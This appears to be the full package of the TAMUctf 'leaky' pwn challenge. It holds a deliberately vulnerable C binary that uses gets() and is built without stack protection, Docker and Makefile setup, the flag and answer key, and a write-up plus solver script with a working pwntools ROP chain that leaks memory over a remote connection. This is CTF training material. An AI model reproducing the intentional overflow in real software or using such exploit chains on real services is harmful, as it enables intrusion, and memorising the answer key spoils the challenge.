{
    "22fd6f00-207c-11eb-95a8-84cedea2bb99.png": "[Binary file or unsupported type: png]",
    "2b08df00-207b-11eb-8689-ae7e03aaa5d1.png": "[Binary file or unsupported type: png]",
    "9357c080-207b-11eb-80ae-9b684cbef12b.png": "[Binary file or unsupported type: png]",
    "cd27c780-2079-11eb-9283-e22c73d12473.png": "[Binary file or unsupported type: png]",
    "challenge.py": "from hacksport.operations import execute\nfrom hacksport.problem import Challenge, File\n\n\nclass Problem(Challenge):\n    def setup(self):\n        self.files = []\n\n    def generate_flag(self, random):\n        return r\"gigem{l34ky_m3m0ry}\"\n",
    "Dockerfile": "FROM debian:bullseye-slim as build\n\nRUN apt-get update -y; apt-get install build-essential -y\nADD leaky.c /tmp/leaky.c\nADD flag_check.c /tmp/flag_check.c\nADD Makefile /tmp/Makefile\nRUN cd /tmp/; make all\n\nFROM debian:bullseye-slim\n\nRUN apt-get update -y;apt-get install socat -y\n\nCOPY --from=build /tmp/leaky /pwn/leaky\nCOPY --from=build /tmp/flag_check.o /pwn/flag_check.o\nWORKDIR /pwn\n\nEXPOSE 8374\n\nENTRYPOINT [\"sh\", \"-c\", \"exec socat TCP-LISTEN:8374,reuseaddr,fork EXEC:/pwn/leaky,stderr\"]\n",
    "f5b0c100-207b-11eb-86bd-815f407cb7e0.png": "[Binary file or unsupported type: png]",
    "f7798500-2079-11eb-95af-bc1b459deda7.png": "[Binary file or unsupported type: png]",
    "flag.txt": "gigem{l34ky_m3m0ry}",
    "flag_check.c": "int flag_check(char* flag, int len) {\n    int output = 1;\n    if (len != 19) { return 0; }\n    output &= flag[0] == 'g';\n    output &= flag[1] == 'i';\n    output &= flag[2] == 'g';\n    output &= flag[3] == 'e';\n    output &= flag[4] == 'm';\n    output &= flag[5] == '{';\n    output &= flag[6] == 'l';\n    output &= flag[7] == '3';\n    output &= flag[8] == '4';\n    output &= flag[9] == 'k';\n    output &= flag[10] == 'y';\n    output &= flag[11] == '_';\n    output &= flag[12] == 'm';\n    output &= flag[13] == '3';\n    output &= flag[14] == 'm';\n    output &= flag[15] == '0';\n    output &= flag[16] == 'r';\n    output &= flag[17] == 'y';\n    output &= flag[18] == '}';\n    return output;\n}",
    "leaky.c": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n\nvoid vuln(char* main_buf) {\n\tprintf(\"What's the flag? \");\n\tchar buf[32];\n\tfflush(0);\n\tgets(buf);\n\tmemcpy(main_buf, buf, 32);\n\tprintf(\"\\n\");\n}\n\nvoid main() {\n\tsetvbuf(stdout, 0, 2, 0);\n\tint lib = open(\"flag_check.o\",O_RDONLY);\n\tvoid* lib_flagcheck = mmap(0x10000000, 2048, PROT_EXEC | PROT_READ, MAP_PRIVATE, lib, 0);\n\tchar buf[32];\n\tvuln(&buf);\n\n\n\tint len = strlen(buf);\n\tif(buf[len-1] == '\\n') {\n\t\tbuf[len-1] = '\\0';\n\t\tlen = len - 1;\n\t}\n\tint (*flag_check)(char*, int) = (0x10000000 + 0x40); \n\tif ((*flag_check)(&buf, len) == 1) {\n\t\tprintf(\"Correct!\\n\");\n\t} else {\n\t\tprintf(\"That's wrong :(\\n\");\n\t}\n}\n",
    "Makefile": "CC := $(or $(CC),gcc)\nCFLAGS := -fno-stack-protector -no-pie\nCONTAINER := leaky\n\nall: leaky flag_check\n\nclean: .PHONY\n\trm -f leaky flag_check.o\n\nleaky: leaky.c\n\t$(CC) $(CFLAGS) $^ -o $@\n\nflag_check: flag_check.c\n\t$(CC) -fno-asynchronous-unwind-tables -s -c $^ -o $@.o\n\ndocker: Dockerfile leaky.c flag_check.c\n\tdocker build -t $(CONTAINER) .\n\nrun: docker\n\tdocker run --rm -ti --name $(CONTAINER) $(CONTAINER)\n\nrun_detached: docker\n\tdocker run --rm -d -p 8374:8374 --name $(CONTAINER) $(CONTAINER)\n\n\nextract: docker\n\t$(eval id := $(shell docker create $(CONTAINER)))\n\tdocker cp $(id):/pwn/. - | tar xv\n\tdocker rm -v $(id)\n\n.PHONY:",
    "problem.json": "{\n  \"name\": \"leaky\",\n  \"category\": \"Pwn\",\n  \"description\": \"Attack this binary and get the flag!\\n<a href='http://tamuctf.com/static-files/leaky'>leaky</a>\\n<code>openssl s_client -connect tamuctf.com:443 -servername leaky -quiet</code>\",\n  \"score\" : 250,\n  \"hints\": [\"\"],\n  \"walkthrough\": \"N/A\",\n  \"author\": \"Teddy Heinen\",\n  \"organization\": \"TAMUctf\",\n  \"event\": \"TAMUctf\"\n}\n\n",
    "README.md": "# leaky\n\n## Description\n\nAttack this binary and get the flag!\n\n```nc challenges.tamuctf.com 8374```\n\n## Solution\n\n`gigem{l34ky_m3m0ry}`\n\nAbsolutely cursed.\n\nLeaky loads and executes a .o manually:\n\n![figur\u00eb](f7798500-2079-11eb-95af-bc1b459deda7.png)\n\nThis is likely the flag-checking code. Unfortunately, it's not provided to us, so this isn't trivial reversing.\n\nLeaky is trivially vulnerable to buffer overflow:\n\n![figur\u00eb](cd27c780-2079-11eb-9283-e22c73d12473.png)\n\nThere's no obvious execve exploit here, but there are gadgets for puts, printf, putchar, etc. The name being a bit of a hint, let's leak flag_check.o.\n\n```python\nfrom pwn import *\nimport re\n\ncontext.log_level = 'error'\n\nelf = ELF(\"./leaky\")\nrop = ROP(elf)\n\npop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]\nputs_gadget = elf.plt['puts']\nvuln_gadget = elf.symbols['vuln']\n\nwith open(\"flag_check_gen.o\", \"wb\") as f:\n    i = 0\n    while i < 0x800:\n        print(\"Trying\", 0x10000000 + i)\n\n        chain = p64(0x10000000 + i) + p64(puts_gadget) + p64(vuln_gadget) + b'A' * 16 + p64(pop_rdi)\n\n        p = remote('34.123.3.89', 8374)\n        # p = gdb.debug(\"./leaky\")\n        # p = elf.process()\n\n        p.recvuntil(\"What's the flag? \")\n        p.sendline(chain)\n        p.recvuntil(\"\\n\")\n\n        resp = p.recvuntil(\"\\n\", drop=True).replace(b\"That's wrong :(\", b\"\") + b\"\\0\"\n\n        # print(resp)\n        f.write(resp)\n        i += len(resp)\n        p.close()\n```\n\nThis code effectively scans the `flag_check.o` by reading the memory it's mapped to. We need to pop the location we're scanning into %rdi because that register is the first argument to puts, so we pop `0x10000000 + i` into %rdi, then call puts for this chain.\n\nBecause `puts` terminates at null bytes, we'll just read until the newline of puts and then quit and start a new connection. This is somewhat dangerous as there may be \"newlines\" in the \"strings\" present in the elf, but we'll survive. We call `vuln` again just to give it something to do, but this realistically shouldn't be a problem (and a quick `setvbuf` will probably fix it).\n\nThis successfully extracts the file, but we're greeted with:\n\n![figur\u00eb](2b08df00-207b-11eb-8689-ae7e03aaa5d1.png)\n\nTo get around this, notice this instruction which jumps over a large amount of the listing:\n\n![figur\u00eb](9357c080-207b-11eb-80ae-9b684cbef12b.png)\n\nThis happens because Ghidra uses [recursive descent disassembly](https://reverseengineering.stackexchange.com/a/2350).\n\nTo force a linear disassembly at this location, we simply hit the \"d\" key on the keyboard to force disassembly of these instructions.\n\n![figur\u00eb](f5b0c100-207b-11eb-86bd-815f407cb7e0.png)\n\nGhidra makes a new function here instead of tacking onto `flag_check` due to reasons. Helpfully, the decompilation of this section is quite easy to read, and we get our flag by simply reading the compared characters in order:\n\n![figur\u00eb](22fd6f00-207c-11eb-95a8-84cedea2bb99.png)\n\nNote that, in the decompilation above, you can clearly see the effects of splitting at newlines (the `y` of `l34ky` is set to overwrite the 0th index, but in reality it's overwriting the 10th and our scanning completely whiffed because it replaced it with 0).\n",
    "solver.py": "from pwn import *\nimport re\n\ncontext.terminal = [\"termite\",\"-e\"]\n\nelf = ELF(\"./leaky\")\nrop = ROP(elf)\n\n\nflag_check = b''\n\npop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]\n\ncounter = 0\n\ndef leak_index(i):\n\tglobal flag_check\n\tglobal counter\n\tpayload = p64(0x10000000 + i) + p64(elf.plt['puts']) + p64(elf.symbols['vuln']) + b'D' * (8) + b'E' * (8) + p64(pop_rdi)\n\tprint(payload)\n\tp = remote(\"localhost\", 4444)\n\t# p = elf.process()\n\tp.recvuntil(\"What's the flag? \")\n\tp.sendline(payload)\n\tp.recvuntil('\\n')\n\tdata = b''\n\tif True: #\n\t\tdata = \tp.recvuntil('\\n', drop=True).replace(b\"That's wrong :(\",b\"\")\n\telse:\n\t\tpass\n\tflag_check += data + b'\\0'\n\tprint(data)\n\tcounter += len(data) + 1\n\tp.close()\n\nwhile counter <= 2048:\n\tleak_index(counter)\n\tprint(chr(27) + \"[2J\")\n\tprint(flag_check)\n\nopen(\"flag_check_reverse.o\",\"wb\").write(flag_check)\n\n# print(p.recvall())\n",
    "category": "pwn"
}